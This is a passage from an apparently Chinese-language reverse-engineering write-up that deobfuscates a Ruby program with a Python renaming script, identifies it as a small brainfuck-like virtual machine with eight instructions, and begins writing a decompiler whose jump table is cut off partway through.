data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @__</span><br>target = <span class="hljs-string">&#x27;@proc2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@__[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $_____</span><br>target = <span class="hljs-string">&#x27;$proc3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @_____</span><br>target = <span class="hljs-string">&#x27;@proc4&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $______</span><br>target = <span class="hljs-string">&#x27;$proc5&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># @______</span><br>target = <span class="hljs-string">&#x27;@proc6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br>target = <span class="hljs-string">&#x27;@varX&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $_______</span><br>target = <span class="hljs-string">&#x27;$proc7&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $___</span><br>target = <span class="hljs-string">&#x27;$arr1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><br><br><span class="hljs-comment"># $____</span><br>target = <span class="hljs-string">&#x27;$var3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @____</span><br>target = <span class="hljs-string">&#x27;@var4&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># [^_]____[^_]</span><br>target = <span class="hljs-string">&#x27;var5&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># [^_]___[^_]</span><br>target = <span class="hljs-string">&#x27;var6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># ______</span><br>target = <span class="hljs-string">&#x27;var7&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># _____</span><br>target = <span class="hljs-string">&#x27;var8&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br>data = data.replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;;\n&quot;</span>, -<span class="hljs-number">1</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out4.rb&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(data)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br><br></code></pre></td></tr></table></figure><p>处理后结果如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$$</span>/<span class="hljs-variable">$$</span>;<br><span class="hljs-variable">@_</span>=<span class="hljs-number">1</span>+<span class="hljs-number">1</span>;<br><span class="hljs-variable">$-</span>_=<span class="hljs-number">1</span>-<span class="hljs-number">2</span>;<br><span class="hljs-variable">$proc1</span>=-&gt;_&#123;_==[]<span class="hljs-params">||</span>_==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-variable">$.</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>+<span class="hljs-variable">$proc1</span>[_[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>]]&#125;<br><span class="hljs-variable">@proc2</span>=-&gt;_,&amp;__&#123;_==[]?[]<span class="hljs-symbol">:</span>[__[_[<span class="hljs-variable">$.</span>]]]+<span class="hljs-variable">@proc2</span>[_[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>],&amp;__]&#125;<br><span class="hljs-variable">$proc3</span>=-&gt;_&#123;<span class="hljs-variable">@proc2</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$.</span>]&#125;]&#125;<br><span class="hljs-variable">@proc4</span>=-&gt;_&#123;<span class="hljs-variable">@proc2</span>[[*_],&amp;-&gt;__&#123;__[-<span class="hljs-number">1</span>]&#125;]&#125;<br><span class="hljs-variable">$proc5</span>=-&gt;_&#123;var6,var7=<span class="hljs-variable">$proc3</span>[_],<span class="hljs-variable">@proc4</span>[_];<br>var8=<span class="hljs-variable">$proc1</span>[var6];<br>var5=&#123;&#125;;<br>__=<span class="hljs-variable">$.</span>;<br>(_=-&gt;&#123;<br>  var5[var7[__]]=var6[__];<br>(__+=<span class="hljs-number">1</span>)==var8 ?<span class="hljs-symbol">var5:</span>_[]&#125;)[]&#125;<br><span class="hljs-variable">@proc6</span>=-&gt;_,__&#123;_=[*_]+[*__];<br>var5=<span class="hljs-variable">$proc1</span>[_];<br>var6=&#123;&#125;;<br>__=<span class="hljs-variable">$.</span>;<br>(var8=-&gt;&#123;<br>  var6[_[__][<span class="hljs-variable">$.</span>]]=_[__][<span class="hljs-number">1</span>];<br>(__+=<span class="hljs-number">1</span>)==var5 ?<span class="hljs-symbol">var6:</span>var8[]&#125;)[]&#125;<br><span class="hljs-variable">$proc7</span>=-&gt;_&#123;<span class="hljs-variable">$arr1</span>=[];<br><span class="hljs-variable">@varX</span>=<span class="hljs-variable">$proc1</span>[_];<br>__=var6=var5=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$var3</span>,<span class="hljs-variable">@var4</span>=&#123;&#125;,[]<br>(var8=-&gt;&#123;<br>  _[var5]==<span class="hljs-string">&#x27;5&#x27;</span>?(<span class="hljs-variable">@var4</span>&lt;&lt;var5)<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  _[var5]==<span class="hljs-string">&#x27;6&#x27;</span>?(<span class="hljs-variable">$var3</span>[<span class="hljs-variable">@var4</span>[-<span class="hljs-number">1</span>]]=var5;<br><span class="hljs-variable">@var4</span>=<span class="hljs-variable">@var4</span>[<span class="hljs-variable">$.</span>..<span class="hljs-variable">$.</span>-<span class="hljs-number">2</span>])<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  (var5+=<span class="hljs-number">1</span>)==@varX?<span class="hljs-variable">$.</span><span class="hljs-symbol">:var8[]</span>&#125;)[]<br><span class="hljs-variable">$var3</span>=<span class="hljs-variable">$var3</span>==&#123;&#125;?&#123;&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">@proc6</span>[<span class="hljs-variable">$var3</span>,<span class="hljs-variable">$proc5</span>[<span class="hljs-variable">$var3</span>]]<br>(var7=-&gt;&#123;_[__]==<br><span class="hljs-string">&#x27;0&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]+=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;1&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]-=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;2&#x27;</span>?(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<br><span class="hljs-variable">$arr1</span>[var6]=STDIN.getc.ord)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-string">?(</span>var6+=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;4&#x27;</span><span class="hljs-string">?(</span>var6-=<span class="hljs-number">1</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;5&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)==<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>var3[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;6&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$arr1</span>[var6]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)!=<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>var3[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;7&#x27;</span>?(<span class="hljs-variable">$&gt;</span>&lt;&lt;(<span class="hljs-string">&#x27;&#x27;</span>&lt;&lt;<span class="hljs-variable">$arr1</span>[var6]))<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>(__+=<span class="hljs-number">1</span>)==@varX?<span class="hljs-symbol">_:</span>var7[]&#125;)[]&#125;<br><span class="hljs-variable">$proc7</span>[<span class="hljs-string">&#xx27;</span>];<br><span class="hljs-keyword">rescue</span> Exception;<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>虚拟机，指令集如下</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 0: arr1[var6]+=1</span><br><span class="hljs-meta"># 1: $arr1[var6]-=1</span><br><span class="hljs-meta"># 2: $arr1[var6]=STDIN.getc.ord</span><br><span class="hljs-meta"># 3: var6+=1</span><br><span class="hljs-meta"># 4: var6-=1</span><br><span class="hljs-meta"># 5: if(arr1[var6] == 0) goto $var3[__]</span><br><span class="hljs-meta"># 6: if(arr1[var6] != 0) goto $var3[__]</span><br><span class="hljs-meta"># 7: putchar(arr1[var6])</span><br></code></pre></td></tr></table></figure><p><code>$var3</code> 是跳转表，是 load 虚拟机字节码的时候生成的，可以直接 print 输出获得。</p><h2 id="编写-decompiler"><a href="#编写-decompiler" class="headerlink" title="编写 decompiler"></a>编写 decompiler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#xx27;</span><br><br>addr = <span class="hljs-number">0</span><br>var3 = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;_5&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;_9&#x27;</span>,<br> <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;_21&#x27;</span>,<br> <span class="hljs-number">43</span>: <span class="hljs-string">&#x27;_36&#x27;</span>,<br> <span class="hljs-number">76</span>: <span class="hljs-string">&#x27;_59&#x27;</span>,<br> <span class="hljs-number">93</span>: <span class="hljs-string">&#x27;_60&#x27;</span>,<br> <span class="hljs-number">100</span>: <span class="hljs-string">&#x27;_67&#x27;</span>,<br> <span class="hljs-number">105</span>: <span class="hljs-string">&#x27;_6c&#x27;</span>,<br> <span class="hljs-number">109</span>: <span class="hljs-string">&#x27;_76&#x27;</span>,<br> <span class="hljs-number">119</span>: <span class="hljs-string">&#x27;_7d&#x27;</span>,<br> <span class="hljs-number">128</span>: <span class="hljs-string">&#x27;_83&#x27;</span>,<br> <span class="hljs-number">135</span>: <span class="hljs-string">&#x27;_8a&#x27;</span>,<br> <span class="hljs-number">139</span>: <span class="hljs-string">&#x27;_8e&#x27;</span>,<br> <span class="hljs-number">149</span>: <span class="hljs-string">&#x27;_a5&#x27;</span>,<br> <span class="hljs-number">170</span>: <span class="hljs-string">&#x27;_b0&#x27;</span>,<br> <span class="hljs-number">180</span>: <span class="hljs-string">&#x27;_b7&#x27;</span>,<br> <span class="hljs-number">186</span>: <span class="hljs-string">&#x27;_bd&#x27;</span>,<br> <span class="hljs-number">193</span>: <span class="hljs-string">&#x27;_c4&#x27;</span>,<br> <span class="hljs-number">199</span>: <span class="hljs-string">&#x27;_d4&#x27;</span>,<br> <span class="hljs-number">213</span>: <span class="hljs-string">&#x27;_db&#x27;</span>,<br> <span class="hljs-number">224</span>: <span class="hljs-string">&#x27;_e3&#x27;</span>,<br> <span class="hljs-number">177</span>: <span class="hljs-string">&#x27;_e4&#x27;</span>,<br> <span class="hljs-number">228</span>: <span class="hljs-string">&#x27;_e7&#x27;</span>,<br> <span class="hljs-number">235</span>: <span class="hljs-string">&#x27;_ee&#x27;</span>,<br> <span class="hljs-number">239</span>: <span class="hljs-string">&#x27;_f2&#x27;</span>,<br> <span class="hljs-number">248</span>: <span class="hljs-string">&#x27;_106&#x27;</span>,<br> <span class="hljs-number">268</span>: <span class="hljs-string">&#x27;_112&#x27;</span>,<br> <span class="hljs-number">278</span>: <span class="hljs-string">&#x27;_119&#x27;</span>,<br> <span class="hljs-number">284</span>: <span class="hljs-string">&#x27;_11f&#x27;</span>,<br> <span class="hljs-number">291</span>: <span class="hljs-string">&#x27;_126&#x27;</span>,<br> <span class="hljs-number">297</span>: <span class="hljs-string">&#x27;_136&#x27;</span>,<br> <span class="hljs-number">311</span>: <span class="hljs-string">&#x27;_13d&#x27;</span>,<br> <span class="hljs-number">322</span>: <span class="hljs-string">&#x27;_145&#x27;</span>,<br> <span class="hljs-number">275</span>: <span class="hljs-string">&#x27;_146&#x27;</span>,<br> <span class="hljs-number">326</span>: <span class="hljs-string">&#x27;_149&#x27;</span>,<br> <span class="hljs-number">333</span>: <span class="hljs-string">&#x27;_150&#x27;</span>,<br> <span class="hljs-number">337</span>: <span class="hljs-string">&#x27;_154&#x27;</span>,<br> <span class="hljs-number">348</span>: <span class="hljs-string">&#x27;_16c&#x27;</span>,<br> <span class="hljs-number">370</span>: <span class="hljs-string">&#x27;_178&#x27;</span>,<br> <span class="hljs-number">380</span>: <span class="hljs-string">&#x27;_17f&#x27;</span>,<br> <span class="hljs-number">386</span>: <span class="hljs-string">&#x27;_185&#x27;</span>,<br> <span class="hljs-number">393</span>: <span class="hljs-string">&#x27;_18c&#x27;</span>,<br> <span class="hljs-number">399</span>: <span class="hljs-string">&#x27;_19c&#x27;</span>,<br> <span class="hljs-number">413</span>: <span class="hljs-string">&#x27;_1a3&#x27;</span>,<br> <span class="hljs-number">424</span>: <span class="hljs-string">&#x27;_1ab&#x27;</span>,<br> <span class="hljs-number">377</span>: <span class="hljs-string">&#x27;_1ac&#x27;</span>,<br> <span class="hljs-number">428</span>: <span class="hljs-string">&#x27;_1af&#x27;</span>,<br> <span class="hljs-number">435</span>: <span class="hljs-string">&#x27;_1b6&#x27;</span>,<br> <span class="hljs-number">439</span>: <span class="hljs-string">&#x27;_1ba&#x27;</span>,<br> <span class="hljs-number">450</span>: <span class="hljs-string">&#x27;_1d3&#x27;</span>,<br> <span class="hljs-number">473</span>: <span class="hljs-string">&#x27;_1df&#x27;</span>,<br> <span class="hljs-number">483</span>: <span class="hljs-string">&#x27;_1e6&#x27;</span>,<br> <span class="hljs-number">489</span>: <span class="hljs-string">&#x27;_1ec&#x27;</span>,<br> <span class="hljs-number">496</span>: <span class="hljs-string">&#x27;_1f3&#x27;</span>,<br> <span class="hljs-number">502</span>: <span class="hljs-string">&#x27;_203&#x27;</span>,<br> <span class="hljs-number">516</span>: <span class="hljs-string">&#x27;_20a&#x27;</span>,<br> <span class="hljs-number">527</span>: <span class="hljs-string">&#x27;_212&#x27;</span>,<br> <span class="hljs-number">480</span>: <span class="hljs-string">&#x27;_213&#x27;</span>,<br> <span class="hljs-number">531</span>: <span class="hljs-string">&#x27;_216&#x27;</span>,<br> <span class="hljs-number">538</span>: <span class="hljs-string">&#x27;_21d&#x27;</span>,<br> <span class="hljs-number">542</span>: <span class="hljs-string">&#x27;_221&#x27;</span>,<br> <span class="hljs-number">550</span>: <span class="hljs-string">&#x27;_236&#x27;</span>,<br> <span class="hljs-number">571</span>: <span class="hljs-string">&#x27;_241&#x27;</span>,<br> <span class="hljs-number">581</span>: <span class="hljs-string">&#x27;_248&#x27;</span>,<br> <span class="hljs-number">587</span>: <span class="hljs-string">&#x27;_24e&#x27;</span>,<br> <span class="hljs-number">594</span>: <span class="hljs-string">&#x27;_255&#x27;</span>,<br> <span class="hljs-number">600</span>: <span class="hljs-string">&#x27;_265&#x27;</span>,<br> <span class="hljs-number">614</span>: <span class="hljs-string">&#x27;_26c&#x27;</span>,<br> <span class="hljs-number">625</span>: <span class="hljs-string">&#x27;_274&#x27;</span>,<br> <span class="hljs-number">578</span>: <span class="hljs-string">&#x27;_275&#x27;</span>,<br> <span class="hljs-number">629</span>: <span class="hljs-string">&#x27;_278&#x27;</span>,<br> <span class="hljs-number">633</span>: <span class="hljs-string">&#x27;_27c&#x27;</span>,<br> <span class="hljs-number">638</span>: <span class="hljs-string">&#x27;_287&#x27;</span>,<br> <span class="hljs-number">649</span>: <span class="hljs-string">&#x27;_291&#x27;</span>,<br> <span class="hljs-number">661</span>: <span class="hljs-string">&#x27;_298&#x27;</span>,<br> <span class="hljs-number">665</span>: <span class="hljs-string">&#x27;_29c&#x27;</span>,<br> <span class="hljs-number">678</span>: <span class="hljs-string">&#x27;_2b5&#x27;</span>,<br> <span class="hljs-number">703</span>: <span class="hljs-string">&#x27;_2c2&#x27;</span>,<br> <span class="hljs-number">658</span>: <span class="hljs-string">&#x27;_2c3&#x27;</span>,<br> <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;_3&#x27;</span>,<br> <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;_7&#x27;</span>,<br> <span class="hljs-number">32</span>: <span class="hljs-string">&#x27;_14&#x27;</span>,<br> <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;_2c&#x27;</span>,<br> <span class="hljs-number">88</span>: <span class="hljs-string">&#x27;_4d&#x27;</span>,<br> <span class="hljs-number">95</span>: <span class="hljs-string">&#x27;_5e&#x27;</span>,<br> <span class="hljs-number">102</span>: <span class="hljs-string">&#x27;_65&#x27;</span>,<br> <span class="hljs-number">107</span>: <span class="hljs-string">&#x27;_6a&#x27;</span>,<br> <span class="hljs-number">117</span>: <span class="hljs-string">&#x27;_6e&#x27;</span>,<br> <span class="hljs-number">124</span>: <span class="hljs-string">&#x27;_78&#x27;</span>,<br> <span class="hljs-number">130</span>: <span class="hljs-string">&#x27;_81&#x27;</span>,<br> <span class="hljs-number">137</span>: <span class="hljs-string">&#x27;_88&#x27;</span>,<br> <span class="hljs-number">141</span>: <span class="hljs-string">&#x27;_8c&#x27;</span>,<br> <span class="hljs-number">164</span>: <span class="hljs-string">&#x27;_96&#x27;</span>,<br> <span class="hljs-number">175</span>: <span class="hljs-string">&#x27;_ab&#x27;</span>,<br> <span class="hljs-number">182</span>: <span class="hljs-string">&#x27;_b5&#x27;</span>,<br> <span class="hljs-number">188</span>: <span class="hljs-string">&#x27;_bb&#x27;</span>,<br> <span class="hljs-number">195</span>: <span class="hljs-string">&#x27;_c2&#x27;</span>,<br> <span class="hljs-number">211</span>: <span class="hljs-string">&#x27;_c8&#x27;</span>,<br> <span class="hljs-number">218</span>: <span class="hljs-string">&#x27;_d6&#x27;</span>,<br> <span class="hljs-number">226</span>: <span class="hljs-string">&#x27;_e1&#x27;</span>,<br> <span class="hljs-number">227</span>: <span class="hljs-string">&#x27;_b2&#x27;</span>,<br> <span class="hljs-number">230</span>: <span class="hljs-string">&#x27;_e5&#x27;</span>,<br> <span class="hljs-number">237</span>: <span class="hljs-string">&#x27;_ec&#x27;</span>,<br> <span class="hljs-number">241</span>: <span class="hljs-string">&#x27;_f0&#x27;</span>,<br> <span class="hljs-number">261</span>: <span class="hljs-string">&#x27;_f9&#x27;</span>,<br> <span class="hljs-number">273</span>: <span class="hljs-string">&#x27;_10d&#x27;</span>,<br> <span class="hljs-number">280</span>: <span class="hljs-string">&#x27;_117&#x27;</span>,<br> <span class="hljs-number">286</span>: <span class="hljs-string">&#x27;_11d&#x27;</span>,<br> <span class="hljs-number">293</span>: <span class="hljs-string">&#x27;_124&#x27;</span>,<br> <span class="hljs-number">309</span>: <span class="hljs-string">&#x27;_12a&#x27;</span>,<br> <span class="hljs-number">316</span>: <span class="hljs-string">&#x27;_138&#x27;</span>,<br> <span class="hljs-number">324</span>: <span class="hljs-string">&#x27;_143&#x27;</span>,<br> <span class="hljs-number">325</span>: <span class="hljs-string">&#x27;_114&#x27;</span>,<br> <span class="hljs-number">328</span>: <span class="hljs-string">&#x27;_147&#x27;</span>,<br> <span class="hljs-number">335</span>: <span class="hljs-string">&#x27;_14e&#x27;</span>,<br> <span class="hljs-number">339</span>: <span class="hljs-string">&#x27;_152&#x27;</span>,<br> <span class="hljs-number">363</span>: <span class="hljs-string">&#x27;_15d&#x27;</span>,<br> <span class="hljs-number">375</span>: <span class="hljs-string">&#x27;_173&#x27;</span>,<br> <span class="hljs-number">382</span>: <span class="hljs-string">&#x27;_17d&#x27;</span>,<br> <span class="hljs-number">388</span>: <span class="hljs-string">&#x27;_183&#x27;</span>,<br> <span class="hljs-number">395</span>: <span class="hljs-string">&#x27;_18a&#x27;</span>,<br> <span class="hljs-number">411</span>: <span class="hljs-string">&#x27;_190&#x27;</span>,<br> <span class="hljs-number">418</span>: <span class="hljs-string">&#x27;_19e&#x27;</span>,<br> <span class="hljs-number">426</span>: <span class="hljs-string">&#x27;_1a9&#x27;</span>,<br> <span class="hljs-number">427</span>: <span class="hljs-string">&#x27;_17a&#x27;</span>,<br> <span class="hljs-number">430</span>: <span class="hljs-string">&#x27;_1ad&#x27;</span>,<br> <span class="hljs-number">437</span>: <span class="hljs-string">&#x27;_1b4&#x27;</span>,<br> <span class="hljs-number">441</span>: <span class="hljs-string">&#x27;_1b8&#x27;</span>,<br> <span class="hljs-number">466</span>: <span class="hljs-string">&#x27;_1c3&#x27;</span>,<br> <span class="hljs-number">478</span>: 